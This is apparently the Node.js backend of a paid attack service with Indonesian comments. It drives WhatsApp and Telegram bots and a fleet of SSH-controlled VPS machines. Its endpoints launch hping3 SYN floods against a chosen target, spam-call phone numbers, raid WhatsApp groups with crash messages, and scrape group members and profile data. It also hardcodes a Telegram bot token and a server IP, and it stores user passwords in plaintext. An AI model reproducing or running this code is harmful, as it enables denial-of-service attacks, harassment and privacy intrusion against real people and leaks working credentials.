const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [

  { bug_id: "forcelose", bug_name: "FORCLOSE ONE MSG" },
  { bug_id: "delayy", bug_name: "INVIS BULDOZER" },
  { bug_id: "fcinvis", bug_name: "FORCLOSE INVIS" },
  { bug_id: "crash", bug_name: "CRASH ANDRO" },
  { bug_id: "forcelose", bug_name: "FORCLOSE BETA CRASH" },
  { bug_id: "crash", bug_name: "UIX KILERX" },
  
  //{ bug_id: "ui_kill", bug_name: "Android UI Killer" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));

// Initialize these variables properly at the beginning
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Fix: Proper file watcher initialization
let keyListWatcher = null;

function watchKeyList() {
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  
  keyListWatcher = fs.watchFile("keyList.json", () => {
    console.log("[📂] keyList.json changed, reloading...");
    try {
      sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
    } catch (err) {
      console.error("Error reloading keyList.json:", err.message);
    }
  });
}

// Initialize watcher
watchKeyList();

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  try {
    chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
  } catch (err) {
    console.error("Error loading chat file:", err.message);
    chatList = [];
  }
}

// Simpan chat
function saveChat() {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
  } catch (err) {
    console.error("Error saving chat file:", err.message);
  }
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8037517583:AAGFFv61AJPOowKiWp_L4xZyaAK3jNoVZRE"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });
const ID_GROUP = [
    -5135829803
];

const ID_GROUP_UTAMA = [
    -5135829803
];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}
const OWNER_ID = 8007935748;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 3000;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://104.236.12.4:${wsPort}`);
});

const PORT = 3000;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 10 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (err) {
    console.error("Error loading VPS file:", err.message);
  }
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  // Ensure all users have coins field
  data.forEach(user => {
    if (user.coins === undefined) user.coins = 100; // Default 100 coins
  });
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DeathVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

// ===== ENDPOINT AUTO REGISTER DARI APP =====
app.post("/autoRegister", (req, res) => {
  const { androidId } = req.body;

  if (!androidId) {
    return res.json({ 
      success: false, 
      message: "androidId diperlukan" 
    });
  }

  try {
    const db = loadDatabase();

    // Generate random username (5 huruf)
    const username = Array.from({ length: 5 }, () => 
      String.fromCharCode(97 + Math.floor(Math.random() * 26))
    ).join('').toUpperCase();

    // Generate random password (5 angka)
    const password = Array.from({ length: 5 }, () => 
      Math.floor(Math.random() * 10)
    ).join('');

    // Cek jika username sudah ada (retry jika perlu)
    if (db.find(u => u.username === username)) {
      return res.json({ 
        success: false, 
        message: "Username conflict, coba lagi" 
      });
    }

    // Set expired date (30 jam dari sekarang)
    const expiredDate = new Date();
    expiredDate.setHours(expiredDate.getHours() + 30);

    // Buat akun baru
    const newUser = {
      username,
      password,
      role: "member",
      expiredDate: expiredDate.toISOString().split("T")[0],
      coins: 0,
      androidId
    };

    db.push(newUser);
    saveDatabase(db);

    // Log
    const logLine = `${new Date().toISOString()} | AUTO_REGISTER | ${username} created from app (Android: ${androidId})\n`;
    fs.appendFileSync('logUser.txt', logLine);

    console.log(`[✅ AUTO REGISTER] ${username} created`);

    // Kirim notifikasi ke grup Telegram
    sendToGroups(
      `🎉 *Pendaftaran Otomatis Baru*\n\n` +
      `👤 Username: \`${username}\`\n` +
      `🔑 Password: \`${password}\`\n` +
      `🎯 Role: Member\n` +
      `⏳ Expired: 30 jam\n` +
      `💰 Coin: 0\n` +
      `📱 Android ID: ${androidId}\n` +
      `⏰ Waktu: ${new Date().toLocaleString("id-ID")}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      success: true,
      username,
      password,
      role: "member",
      expiredDate: newUser.expiredDate,
      coins: 0,
      message: "Akun berhasil dibuat!"
    });

  } catch (err) {
    console.error("[❌ AUTO REGISTER ERROR]", err.message);
    return res.json({ 
      success: false, 
      message: "Terjadi kesalahan server" 
    });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

// ===== SISTEM TOP UP COIN YANG SUDAH DIPERBAIKI =====
const TOPUP_FILE = "topup_requests.json";
const REDEEM_FILE = "redeem_codes.json";

function loadTopupRequests() {
  if (!fs.existsSync(TOPUP_FILE)) {
    fs.writeFileSync(TOPUP_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(TOPUP_FILE));
}

function saveTopupRequests(data) {
  fs.writeFileSync(TOPUP_FILE, JSON.stringify(data, null, 2));
}

function loadRedeemCodes() {
  if (!fs.existsSync(REDEEM_FILE)) {
    fs.writeFileSync(REDEEM_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(REDEEM_FILE));
}

function saveRedeemCodes(data) {
  fs.writeFileSync(REDEEM_FILE, JSON.stringify(data, null, 2));
}

function findUserByTelegramId(telegramId) {
  const db = loadDatabase();
  let user = db.find(u => u.telegram_id === telegramId);
  
  if (!user) {
    user = db.find(u => u.username === telegramId.toString());
  }
  
  return user;
}

// ===== COMMAND: /register - Daftarkan Telegram ID ke akun =====
bot.onText(/^\/register\s+(\S+)\s+(\S+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from.id;
  const username = match[1].trim();
  const password = match[2].trim();

  const db = loadDatabase();
  
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    return bot.sendMessage(chatId, "❌ Username atau password salah!");
  }

  if (user.telegram_id) {
    return bot.sendMessage(chatId, "⚠️ Akun ini sudah terdaftar dengan Telegram ID lain!");
  }

  user.telegram_id = telegramId;
  
  if (user.coins === undefined) {
    user.coins = 100;
  }
  
  saveDatabase(db);

  bot.sendMessage(chatId, `✅ *Berhasil Mendaftar!*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💰 Coin: ${user.coins}
⏳ Expired: ${user.expiredDate}

Sekarang kamu bisa menggunakan command:
• /topup <jumlah> - Request top up coin
• /checkcoin - Cek saldo coin
• /redeem <kode> - Redeem kode coin`, { parse_mode: "Markdown" });
});

// ===== COMMAND: /topup <jumlah> - Request top up =====
bot.onText(/^\/topup\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const amount = parseInt(match[1]);

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (amount < 25) {
    return bot.sendMessage(chatId, "❌ Minimal top up adalah 25 coin.");
  }

  const topupRequests = loadTopupRequests();
  const hasPending = topupRequests.find(r => r.userId === userId && r.status === "pending");

  if (hasPending) {
    return bot.sendMessage(chatId, `⚠️ Kamu masih memiliki request top up yang pending.

📋 Request ID: \`${hasPending.requestId}\`
💰 Jumlah: ${hasPending.amount} coins
⏳ Status: Pending

Tunggu hingga diproses oleh admin atau gunakan /canceltopup ${hasPending.requestId} untuk membatalkan.`, { parse_mode: "Markdown" });
  }

  const requestId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const newRequest = {
    requestId,
    userId,
    username: user.username,
    amount,
    status: "pending",
    timestamp: new Date().toISOString(),
    source: "telegram"
  };

  topupRequests.push(newRequest);
  saveTopupRequests(topupRequests);

  bot.sendMessage(chatId, `✅ *Request Top Up Berhasil Dibuat!*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Jumlah: ${amount} coins
⏳ Status: Pending

Silakan tunggu konfirmasi dari admin. Kamu akan mendapat notifikasi jika request disetujui/ditolak.

_Gunakan /canceltopup ${requestId} untuk membatalkan request._`, { parse_mode: "Markdown" });

  // ===== NOTIFIKASI KE OWNER ID SAJA (BUKAN KE GRUP) =====
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${requestId}` },
          { text: "❌ Reject", callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  // KIRIM HANYA KE OWNER_ID, BUKAN KE GRUP
  bot.sendMessage(OWNER_ID, `🔔 *REQUEST TOP UP BARU*

📋 Request ID: \`${requestId}\`
👤 Username: *${user.username}*
🆔 Telegram ID: ${userId}
💰 Jumlah: *${amount} coins*
📱 Source: Telegram
⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}

━━━━━━━━━━━━━━━━━━
Klik tombol di bawah untuk approve/reject:`, options);
});

// ===== COMMAND: /checkcoin - Cek saldo coin =====
bot.onText(/^\/checkcoin$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (user.coins === undefined) {
    user.coins = 100;
    const db = loadDatabase();
    saveDatabase(db);
  }

  bot.sendMessage(chatId, `💰 *Saldo Coin Kamu*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💳 Coin: *${user.coins}*
⏳ Expired: ${user.expiredDate}

━━━━━━━━━━━━━━━━━━
💡 Setiap bug membutuhkan 25 coins.
📝 Gunakan /topup <jumlah> untuk top up.
🎁 Gunakan /redeem <kode> untuk redeem coin.`, { parse_mode: "Markdown" });
});

// ===== COMMAND: /canceltopup <requestId> - Cancel request =====
bot.onText(/^\/canceltopup\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const requestId = match[1].toUpperCase();

  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId);

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan.");
  }

  if (request.status !== "pending") {
    return bot.sendMessage(chatId, `❌ Request sudah diproses dengan status: *${request.status}*`, { parse_mode: "Markdown" });
  }

  if (request.userId !== userId) {
    return bot.sendMessage(chatId, `❌ Request ini bukan milikmu.`);
  }

  // Cancel request
  request.status = "cancelled";
  saveTopupRequests(topupRequests);

